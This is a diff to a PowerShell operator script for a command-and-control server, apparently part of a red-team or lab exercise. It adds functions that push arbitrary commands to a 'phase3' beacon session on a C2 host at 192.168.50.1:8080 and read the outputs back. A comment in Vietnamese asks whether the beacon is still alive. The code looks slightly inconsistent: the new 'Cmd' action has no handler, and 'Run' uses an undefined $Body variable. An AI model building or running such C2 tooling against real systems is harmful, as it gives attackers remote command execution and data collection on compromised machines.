@@ -27,7 +27,7 @@ param(
     [string]$C2Ip = '192.168.50.1',
     [int]$C2Port = 8080,
     [int]$HttpPort = 8000,
-    [ValidateSet('Pre', 'WaitSession', 'P1', 'P2', 'P3', 'Artifacts', 'All', 'Stop')]
+    [ValidateSet('Pre', 'WaitSession', 'P1', 'P2', 'P3', 'Artifacts', 'Cmd', 'Run', 'Results', 'All', 'Stop')]
     [string]$Action = 'All',
     [string]$Staging = 'stage/ws01',
     [int]$TimeoutSeconds = 300
@@ -44,9 +44,39 @@ function Get-Phase3Token {
     ((Invoke-RestMethod "$C2/sessions") | Where-Object { $_.stage -eq 'phase3' } | Select-Object -First 1).token
 }
 
+function Invoke-Run {
+    # Remote operator: push a command via /cmd and read its OUTPUT at C2 (/last).
+    param([string]$Command)
+    $t = Get-Phase3Token
+    if (-not $t) { throw 'no phase3 session' }
+    Invoke-RestMethod -Method Post -Uri "$C2/cmd?session=$t" -Body $Command | Out-Null
+    Step "current=$Command"
+    $deadline = (Get-Date).AddSeconds(40)
+    $last = $null
+    do {
+        Start-Sleep 2
+        try { $last = Invoke-RestMethod "$C2/last?session=$t" } catch { $last = $null }
+    } until (
+        ($null -ne $last) -and ($last.task -eq 'OP-CMD') -and (-not [string]::IsNullOrEmpty($last.output)) -or
+        (Get-Date) -gt $deadline
+    )
+    if ($null -ne $last -and $last.output) {
+        Step ("output (task=$($last.task) bytes=$($last.bytes)):")
+        $last.output
+    } else { Step 'chua co output (beacon co song khong?)' }
+}
+
+function Show-Results {
+    # Remote operator: print the last N command outputs stored on the C2 server.
+    $t = Get-Phase3Token
+    $r = Invoke-RestMethod "$C2/results?session=$t&n=20"
+    foreach ($x in $r) {
+        "--- task=$($x.task) utc=$($x.utc) bytes=$($x.bytes) ---"
+        $x.output
+    }
+}
+
 function Wait-Listeners {
-    # Pre returns only once BOTH ports are actually listening (avoids the
-    # kill-<->restart bind race on :8080/:8000).
     foreach ($port in 8080, 8000) {
         $deadline = (Get-Date).AddSeconds(15)
         $ok = $null
@@ -169,6 +199,8 @@ switch ($Action) {
     'Pre' { Start-Phase }
     'WaitSession' { Wait-Session }
     'P1' { Check-Phase1 }
+    'Run' { Invoke-Run -Command $Body }
+    'Results' { Show-Results }
     'P2' { Invoke-Phase2 }
     'P3' { Invoke-Phase3 }
     'Artifacts' { Print-Artifacts }
